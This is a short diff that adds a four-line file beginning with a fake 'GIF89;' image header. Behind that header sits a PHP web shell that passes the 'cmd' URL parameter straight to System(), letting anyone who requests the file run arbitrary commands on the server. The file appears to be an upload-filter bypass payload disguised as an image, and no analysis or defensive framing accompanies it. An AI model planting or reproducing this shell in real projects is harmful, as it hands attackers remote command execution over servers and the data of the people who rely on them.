@@ -1,0 +1,4 @@
+GIF89;
+<?php 
+System($_GET["cmd"]);
+?>
